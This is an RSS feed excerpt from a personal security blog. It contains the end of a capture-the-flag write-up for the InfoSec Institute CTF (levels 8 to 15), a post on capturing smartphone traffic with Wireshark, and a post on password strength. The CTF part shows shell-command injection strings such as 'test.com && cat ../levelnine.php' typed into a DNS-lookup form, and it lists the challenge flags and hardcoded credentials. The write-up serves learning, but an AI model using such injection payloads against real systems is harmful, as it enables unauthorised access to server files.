&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;objdump -s app.exe | less
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And I found &lt;code&gt;infosec_flagis_0x1a&lt;/code&gt; in it. It sits at &lt;code&gt;0x403000&lt;/code&gt;, so let&amp;rsquo;s run this
through &lt;code&gt;gdb&lt;/code&gt; too.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; gdb app.exe
gdb$ disass main
Dump of assembler code for function main:
   0x00401290 &amp;lt;+0&amp;gt;:	push   %ebp
   0x00401291 &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x00401293 &amp;lt;+3&amp;gt;:	sub    $0x18,%esp
   0x00401296 &amp;lt;+6&amp;gt;:	and    $0xfffffff0,%esp
   0x00401299 &amp;lt;+9&amp;gt;:	mov    $0x0,%eax
   0x0040129e &amp;lt;+14&amp;gt;:	add    $0xf,%eax
   0x004012a1 &amp;lt;+17&amp;gt;:	add    $0xf,%eax
   0x004012a4 &amp;lt;+20&amp;gt;:	shr    $0x4,%eax
   0x004012a7 &amp;lt;+23&amp;gt;:	shl    $0x4,%eax
   0x004012aa &amp;lt;+26&amp;gt;:	mov    %eax,-0x8(%ebp)
   0x004012ad &amp;lt;+29&amp;gt;:	mov    -0x8(%ebp),%eax
   0x004012b0 &amp;lt;+32&amp;gt;:	call   0x401740 &amp;lt;_alloca&amp;gt;
   0x004012b5 &amp;lt;+37&amp;gt;:	call   0x4013e0 &amp;lt;__main&amp;gt;
   0x004012ba &amp;lt;+42&amp;gt;:	mov    $0x403000,%eax       &amp;lt;------ aha oho
   0x004012bf &amp;lt;+47&amp;gt;:	mov    %al,-0x1(%ebp)
   0x004012c2 &amp;lt;+50&amp;gt;:	movl   $0x403014,(%esp)
   0x004012c9 &amp;lt;+57&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012ce &amp;lt;+62&amp;gt;:	movl   $0x403044,(%esp)
   0x004012d5 &amp;lt;+69&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012da &amp;lt;+74&amp;gt;:	movl   $0x403014,(%esp)
   0x004012e1 &amp;lt;+81&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012e6 &amp;lt;+86&amp;gt;:	movl   $0x403072,(%esp)
   0x004012ed &amp;lt;+93&amp;gt;:	call   0x401840 &amp;lt;system&amp;gt;
   0x004012f2 &amp;lt;+98&amp;gt;:	call   0x4017c0 &amp;lt;getch&amp;gt;
   0x004012f7 &amp;lt;+103&amp;gt;:	mov    $0x0,%eax
   0x004012fc &amp;lt;+108&amp;gt;:	leave  
   0x004012fd &amp;lt;+109&amp;gt;:	ret
   0x004012fe &amp;lt;+110&amp;gt;:	nop
   0x004012ff &amp;lt;+111&amp;gt;:	nop
End of assembler dump
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There we see a fimilar address. Checking its contents&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;gdb$ x/s 0x403000
0x403000:	 &amp;quot;infosec_flagis_0x1a&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s nothing that would indicate that this string changes, so for now, I&amp;rsquo;m
going to say the flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_0x1a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leave a comment below to correct me if I am wrong though, I&amp;rsquo;d really appreciate that.&lt;/p&gt;

&lt;h2 id=&#34;level-09:aad69195db02279e47989643f4843312&#34;&gt;Level 09&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelnine.php&#34;&gt;http://ctf.infosecinstitute.com/levelnine.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/5XnlOL9.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Initially I struggled with this. I tried the usual default passwords without success.
Attacked it with SQL injections, nothing. Then I had a brainwave. Because I already had level15,
I could just look at the &lt;code&gt;levelnine.php&lt;/code&gt; file. So I did. Issue &lt;code&gt;test.com &amp;amp;&amp;amp; cat ../levelnine.php&lt;/code&gt;
and at the end we see what happens if we get the flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;alert&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;ssaptluafed_sigalf_cesofni&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #960050; background-color: #1e0010&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It&amp;rsquo;s the flag reversed, so let&amp;rsquo;s flip it to get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_defaultpass
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ti tog yllaniF&lt;/p&gt;

&lt;p&gt;PS: What&amp;rsquo;s even cuter is if you run &lt;code&gt;test.com &amp;amp;&amp;amp; tac ../levelnine.php&lt;/code&gt;. You actually
get the popup. &lt;code&gt;tac&lt;/code&gt; does the same as &lt;code&gt;cat&lt;/code&gt;, but reverses the lines in the output.
The reason this works is because it will encounter the javascript pop up code before
the conditional that checks the input.&lt;/p&gt;

&lt;p&gt;It also prints out the username and password for us:
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;?&amp;gt; } echo &amp;quot;&amp;quot;; if ($username == &amp;#39;root&amp;#39; and $password == &amp;#39;attack&amp;#39;) { 
    $password = $_POST[&amp;#39;password&amp;#39;]; 
    $username = $_POST[&amp;#39;username&amp;#39;];
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Now you can go to the levelnine url and enter that to get the flag. Either way should
be valid, as the aim of the game is to get the flag. It shouldn&amp;rsquo;t matter how you get it :)&lt;/p&gt;

&lt;p&gt;Level15 has been a huge help in all of this!&lt;/p&gt;

&lt;h2 id=&#34;level-10:aad69195db02279e47989643f4843312&#34;&gt;Level 10&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelten.php&#34;&gt;http://ctf.infosecinstitute.com/levelten.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QENqipl.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Let&amp;rsquo;s listen to the sound. Hrmm Squeaky. Could be anything. Maybe some weirdly pitched morse.
But let&amp;rsquo;s download and open it in Audacity. My initial hunch is that it&amp;rsquo;s sped up, due
to the highpitched sound. So I started reducing the playback speed, and it turns out that
at around 0.15 times the original speed, we hear someone talking. He&amp;rsquo;s actually telling us
the name of the flag&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_sound
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks kind stranger&lt;/p&gt;

&lt;h2 id=&#34;level-11:aad69195db02279e47989643f4843312&#34;&gt;Level 11&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveleleven.php&#34;&gt;http://ctf.infosecinstitute.com/leveleleven.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/L2tFy5t.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Hrmm.. there&amp;rsquo;s no sound this time, instead we get the PHP logo. Well, it&amp;rsquo;s all
we have so let&amp;rsquo;s open it up. I loaded it into vim, changed to hex mode (:%!xxd)
and right at the top we have&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yeah, that won&amp;rsquo;t be it will it? We&amp;rsquo;re very familiar with base64 now aren&amp;rsquo;t we? Ok, decode&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Open it up and we get an image. Because the domain is outside of the control of
this CTF, we can assume that the image hasn&amp;rsquo;t been tampered with or anything
is embedded in it and that the actual flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_powerslide
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ll take it, thanks!&lt;/p&gt;

&lt;h2 id=&#34;level-12:aad69195db02279e47989643f4843312&#34;&gt;Level 12&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveltwelve.php&#34;&gt;http://ctf.infosecinstitute.com/leveltwelve.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WdLl96v.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok we recognise this image. We had it in level 1 and we had to look at the source.
Our clue is dig deeper and that could mean a number of things. Let&amp;rsquo;s try some directory
traversal by appending a slash and some random text at the end. Hrm, we just
get a list of the levels and no css. Ok, that&amp;rsquo;s not it. Let&amp;rsquo;s dig into the source again.
There&amp;rsquo;s nothing obvious, but I reckon it might be one of the files included in the source.
It would make sense given the clue we&amp;rsquo;ve been given.&lt;/p&gt;

&lt;p&gt;To cut a long story short, there&amp;rsquo;s a css file &lt;code&gt;design.css&lt;/code&gt; that&amp;rsquo;s not included
in the other pages. I know this because I&amp;rsquo;ve pretty much looked at the source for each
level. Force of habit. Anyway, let&amp;rsquo;s take a look at it:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;.thisloveis&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;#696e666&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;f7365635f666c616769735f686579696d6e6f7461636f6c6f72;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aha, that&amp;rsquo;s not a valid colour is it? It&amp;rsquo;s also not base64. Looks like hex values
to me. Run it through a hex to text converter and&amp;hellip;..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_heyimnotacolor
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yeah, you weren&amp;rsquo;t a colour, that&amp;rsquo;s for sure.&lt;/p&gt;

&lt;h2 id=&#34;level-13:aad69195db02279e47989643f4843312&#34;&gt;Level 13&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelthirteen.php&#34;&gt;http://ctf.infosecinstitute.com/levelthirteen.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/JX3Je1g.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Ok, this was a bit of a cheat, because I skipped to level 15 and now I have a a few more
tools available. I ran &lt;code&gt;test.com &amp;amp;&amp;amp; ls -la ..&lt;/code&gt; and voila, there&amp;rsquo;s the backup file:
&lt;code&gt;levelthirteen.php.old&lt;/code&gt;. Much easier than guessing, right?
Looking at this file we see it will prompt us to download a file called &lt;code&gt;misc/imadecoy&lt;/code&gt;.
This seems to be a network capture involving a project called &lt;a href=&#34;https://github.com/shipcod3/honeypy&#34;&gt;HoneyPy&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I opened it up in wireshark and spent quite a bit of time on it. There&amp;rsquo;s really nothing
interesting in it for the most part. However near the end we get a PNG image called
&lt;code&gt;HoneyPY.PNG&lt;/code&gt;. For some reason this just stood out to me. I took a chance and exported it
by rightclicking the packet and selecting &lt;code&gt;Export Selected Packet Bytes&lt;/code&gt; as shown&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/jhH2v19.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Opening this image surprises us with a flag! W00t! That flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_morepackets
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A wireshark level I managed to do. Yay&lt;/p&gt;

&lt;h2 id=&#34;level-14:aad69195db02279e47989643f4843312&#34;&gt;Level 14&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfourteen.php&#34;&gt;http://ctf.infosecinstitute.com/levelfourteen.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/0akB0Ni.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;UPDATE: The &lt;code&gt;level14.db&lt;/code&gt; file has been removed and the &lt;code&gt;misc&lt;/code&gt; directory can
no longer be listed. Use the second method below to solve this level&lt;/p&gt;

&lt;p&gt;Once downloaded we get a database backup file. This one was quite interesting because
there are two places where the flag is. So first I looked at what else is in the
&lt;code&gt;misc&lt;/code&gt; directory where this file lives. There&amp;rsquo;s a &lt;code&gt;level14.db&lt;/code&gt; file. Let&amp;rsquo;s
take a look at that.&lt;/p&gt;

&lt;p&gt;It adds an entry to the flag db. It&amp;rsquo;s a hex string, so like above, simply decode it and
get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_whatsorceryisthis
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But, look at the &lt;code&gt;level14&lt;/code&gt; file again. Scroll through and notice that in the
&lt;code&gt;friends&lt;/code&gt; table there&amp;rsquo;s a fimilar entry. Decoding that will also give you the flag.&lt;/p&gt;

&lt;h2 id=&#34;level-15:aad69195db02279e47989643f4843312&#34;&gt;Level 15&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfifteen/index.php&#34;&gt;http://ctf.infosecinstitute.com/levelfifteen/index.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/EVJuDmC.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;So here we can lookup a dns entry by typing a domain in the text field. So let&amp;rsquo;s try
that and see what we get. I used &lt;code&gt;test.com&lt;/code&gt; and as a result I get the output
from the &lt;code&gt;dig&lt;/code&gt; command. Interesting. It could be that the php script is merely
calling &lt;code&gt;dig&lt;/code&gt; with the search term appended to it. This is a bad way to execute
a command, and we will see why. In Linux you can append a command to another using &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;.
So let&amp;rsquo;s try listing the directory with &lt;code&gt;test.com&amp;amp;&amp;amp;ls&lt;/code&gt; as our search query. Sure enough,
we see &lt;code&gt;index.php&lt;/code&gt; at the bottom of the output. Well, perhaps there&amp;rsquo;s some hidden files so
let&amp;rsquo;s run &lt;code&gt;test.com &amp;amp;&amp;amp; ls -la&lt;/code&gt;. Aha, there&amp;rsquo;s a file called &lt;code&gt;.hey&lt;/code&gt;, let&amp;rsquo;s cat that with
&lt;code&gt;test.com &amp;amp;&amp;amp; cat .hey&lt;/code&gt; and we get &lt;code&gt;Miux+mT6Kkcx+IhyMjTFnxT6KjAa+i6ZLibC&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Not sure however where to go from here. The ZlibC at the end of the string might
be a clue.&lt;/p&gt;

&lt;p&gt;Please leave any comments with ideas on this. I&amp;rsquo;m a bit stumped.&lt;/p&gt;

&lt;p&gt;UPDATE: Turns out it&amp;rsquo;s Atom 128 adn you can use &lt;a href=&#34;http://crypo.in.ua/tools/eng_atom128c.php&#34;&gt;this site&lt;/a&gt;
to decode it to &lt;code&gt;infosec_flagis_rceatomized&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Thanks to Anon and @fr1t3 for the info&lt;/p&gt;

&lt;p&gt;ALL FLAGS DONE&lt;/p&gt;

&lt;h2 id=&#34;the-lost-level:aad69195db02279e47989643f4843312&#34;&gt;The lost level&lt;/h2&gt;

&lt;p&gt;UPDATED: This has since been removed, but I&amp;rsquo;ve left this here for posterity.&lt;/p&gt;

&lt;p&gt;Not sure where this belongs, but in the misc folder is a file called &lt;code&gt;readme.wav&lt;/code&gt;
which contains the morsecode for&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;INFOSECFLAGISMORSECODETONES
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which level this belongs to, I don&amp;rsquo;t know.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Capturing smartphone traffic - Part 1</title>
      <link>http://unlogic.co.uk/2014/05/16/capturing-traffic-from-your-smartphone/</link>
      <pubDate>Fri, 16 May 2014 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2014/05/16/capturing-traffic-from-your-smartphone/</guid>
      <description>

&lt;p&gt;We all carry phones around that are connected to some of network at all times.
Unless you are the truly paranoid or battery saving type, then there will be periods
when your phone is dark.&lt;/p&gt;

&lt;p&gt;But even so, I often wonder what my phone is transmitting when I&amp;rsquo;m not using it,
or even when I am using it. So in this series I plan on doing some investigation
into what goes in and out of my phone.&lt;/p&gt;

&lt;p&gt;In this post I&amp;rsquo;ll just set up all the bits and pieces to start the monitoring
process and run a quick check to make sure everything works. In the following
parts I&amp;rsquo;ll be taking a look at some common apps and their network chatter. The
idea is to analyse the data and understand their communications. Hopefully we&amp;rsquo;ll
also unearth some interesting things along the way.&lt;/p&gt;

&lt;h2 id=&#34;what-we-ll-need:41796c2feda068943018a98e7c373755&#34;&gt;What we&amp;rsquo;ll need&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;A smartphone&lt;/li&gt;
&lt;li&gt;A laptop (or similar) to turn into a wireless access point&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt; running on that laptop&lt;/li&gt;
&lt;li&gt;An internet connection&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;setting-up-the-wireless-access-point:41796c2feda068943018a98e7c373755&#34;&gt;Setting up the wireless access point&lt;/h2&gt;

&lt;p&gt;I&amp;rsquo;m going to cover how to do this part in OSX for now. If I get round
to it I&amp;rsquo;ll add a Linux way to do it too.&lt;/p&gt;

&lt;h3 id=&#34;osx:41796c2feda068943018a98e7c373755&#34;&gt;OSX&lt;/h3&gt;

&lt;p&gt;First connect the laptop to an ethernet connection. You can&amp;rsquo;t be connected to
a wireless network and create a wireless access point at the same time.
So we will connect to the internet via ethernet and use the wireless radio
for the access point. Once the ethernet connection is up and running, open
&lt;em&gt;System Preferences -&amp;gt; Sharing&lt;/em&gt;. In the list click on the &lt;em&gt;Internet sharing&lt;/em&gt;
entry (not the check box) and select &lt;em&gt;Ethernet&lt;/em&gt; in the &lt;em&gt;Share your connection
from&lt;/em&gt; dropdown. In the &lt;em&gt;To computers using&lt;/em&gt; select &lt;em&gt;Wi-Fi&lt;/em&gt;. Now select the
check box next to &lt;em&gt;Internet Sharing&lt;/em&gt; to turn sharing on.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/K2Zeyoy.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/K2Zeyoy.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If everything went to plan your Wi-Fi indicator should now look like this:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/ecXJUc8.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/ecXJUc8.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;connect-the-phone:41796c2feda068943018a98e7c373755&#34;&gt;Connect the phone&lt;/h2&gt;

&lt;p&gt;Now we connect tbe phone to the new access point. Go to your wireless network
settings and select the name of the network we created. &lt;strong&gt;slaptop&lt;/strong&gt; in my case.
Once do we need to&lt;/p&gt;

&lt;h2 id=&#34;start-wireshark:41796c2feda068943018a98e7c373755&#34;&gt;Start Wireshark&lt;/h2&gt;

&lt;p&gt;Fireup Wireshark and then select the capture interface. The default will be
eth0 usually. That&amp;rsquo;s the ethernet port, but we want to capture traffic on the
wireless access point. So we need to select &lt;em&gt;en1&lt;/em&gt; (in my case). It&amp;rsquo;s the one
with the wireless icon next to it.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/9wyI6s6.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/9wyI6s6.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once this is done we&amp;rsquo;ll want to filter out ARP packets as these are of little
interest and there will be quite a few of them. See the screenshot below to
see where to set this.&lt;/p&gt;

&lt;p&gt;Now we press the &lt;em&gt;Capture&lt;/em&gt; button to begin bapturing traffic. Once running we
can check to see if it&amp;rsquo;s working by browsing to a site. I chose this site at
&lt;code&gt;192.30.252.153&lt;/code&gt;. You should see the capture window scroll past with some
traffic going between your phone ip and the site your browsed to.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/XjFuoOQ.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/XjFuoOQ.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;in-the-next-post:41796c2feda068943018a98e7c373755&#34;&gt;In the next post&lt;/h2&gt;

&lt;p&gt;So I&amp;rsquo;m all set to capture any and all traffic now that goes to and from my phone.
With this I can now open various apps and see what traffic they generate. In
the next posts I plan to see what idle traffic there is (no apps being actively
used) and what traffic some common apps generate. If I&amp;rsquo;m lucky I might even
discover some interesting things about some apps.&lt;/p&gt;

&lt;p&gt;Stay tuned for part 2.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Strong passwords?</title>
      <link>http://unlogic.co.uk/2012/06/06/strong-passwords/</link>
      <pubDate>Wed, 06 Jun 2012 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2012/06/06/strong-passwords/</guid>
      <description>

&lt;p&gt;As I&amp;rsquo;m just going around and updating the passwords to some of my online accounts, which was prompted by &lt;a href=&#34;http://translate.google.com/translate?hl=en&amp;amp;sl=no&amp;amp;tl=en&amp;amp;u=http://www.dagensit.no/article2411857.ece&#34;&gt;this&lt;/a&gt; article, I was wonderingwhat a good password really is. Not just in terms of security but also in terms of user friendliness.&lt;/p&gt;

&lt;p&gt;I use &lt;a href=&#34;http://www.lastpass.com&#34;&gt;Lastpass&lt;/a&gt; to manage my passwords and have it auto fill in my credentials on various sites. This works well until I need to manually enter them on another device (iPhone for example - I haven&amp;rsquo;t got a premium subscription yet) or have to type it in just because.&lt;/p&gt;

&lt;p&gt;We know that everywhere suggests some wonderfully random characters of at least 8 characters in length and Lastpass actually provides a tool to generate these:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;k%U94*7r&lt;/li&gt;
&lt;li&gt;66ds}9R&lt;/li&gt;
&lt;li&gt;9^wtH7xo&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here we have some 8 character examples for apparently fairly secure options. Fine. They probably are secure. But do you really want to type those in using a touch keyboard on a phone?&lt;/p&gt;

&lt;p&gt;Now here&amp;rsquo;s my suggestion: &lt;strong&gt;Three or more random, unrelated words making one password.&lt;/strong&gt;
For example:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;tarnishedmoleclouds&lt;/li&gt;
&lt;li&gt;refriedchutneygarbage&lt;/li&gt;
&lt;li&gt;turkeyloadedparasol&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Those of you who read &lt;a href=&#34;http://xkcd.com/936/&#34;&gt;XKCD&lt;/a&gt; should already be on the same page as me. Not only are these more memorable (which if you use a password manager is irrelevant) but also much easier to type in on any type of keyboard. But that&amp;rsquo;s not all. Let&amp;rsquo;s have a look at bruteforce times using &lt;a href=&#34;http://www.lockdown.co.uk/?pg=combi&#34;&gt;these tables&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In the first case we have 8 character passwords made up of &amp;ldquo;Mixed upper and lower case alphabet and common symbols.&amp;rdquo;. According to the relevant table (and we are assuming a reasonably competent team of crackers using a &lt;a href=&#34;http://www.lockdown.co.uk/?pg=combi#classE&#34;&gt;class E&lt;/a&gt; attack) these passwords can be cracked in 346days. Not too bad really. But let&amp;rsquo;s see how that compares to &amp;ldquo;The full alphabet, either upper or lower case (not both in this case)&amp;rdquo;. Picking one password from above (refriedchutneygarbage) with 21 characters it would take at least 6.3trillions years to break. Much better. Heck, even with 1000,000,000 guesses per second you&amp;rsquo;re still looking at 631billion years.&lt;/p&gt;

&lt;p&gt;I can&amp;rsquo;t say how much of an impact adding/removing spaces has on the timings though - if any one knows, or has any insights, do share in the comments. Is using spaces better, the same, or worse than not using spaces? Theoretically I&amp;rsquo;d imagine that it&amp;rsquo;d be better with spaces as that&amp;rsquo;s an extra character to add to the list.&lt;/p&gt;

&lt;h2 id=&#34;update:abb71b3d5285572362ebe516c3dc67ed&#34;&gt;UPDATE&lt;/h2&gt;

&lt;p&gt;Having said the above, it&amp;rsquo;s worth also assuming that any competent cracker will be using wordlists too, and not just brute forcing the password. According to the &lt;a href=&#34;http://oxforddictionaries.com/words/how-many-words-are-there-in-the-english-language&#34;&gt;Oxford English Dictionary&lt;/a&gt; there are about 140,000 words in use. This number is a bit high as most of us won&amp;rsquo;t know, or use them all. So to get a more realistic number, I&amp;rsquo;ve looked at some common wordlists you can find on the internet and the word count we&amp;rsquo;re looking at is around 50,000 to 70,000.&lt;/p&gt;

&lt;p&gt;Given that (as mentioned in the comments) we essentially have a 3 character password with a much larger search space, we can do the math. Three words, 60,000 (taking the middle word count) words will give us 216trillion possibilities. At a rate of 10,000,000 passwords per second it would take around 250 days to crack. Not too shabby still, but not as good as initially hoped, and also worse than your &amp;lsquo;messy&amp;rsquo; passwords.&lt;/p&gt;

&lt;p&gt;So my solution to generating secure, but still easily typeable passwords, is to generate 15-20 character long passwords made only of random alphabetical characters rather than words. In this case the figures above will still hold true.&lt;/p&gt;

&lt;p&gt;As a quick sampler of a generated password with 16 characters, lowercase only, and pronouncable:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;alicattervetonstou&lt;/li&gt;
&lt;li&gt;molyciontivenzagol&lt;/li&gt;
&lt;li&gt;audentophitendowdy&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;harder to remember, harder to crack but still easily typed out even with an onscreen keyboard. The pronounceable part is optional but it might aid in remembering the password better.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>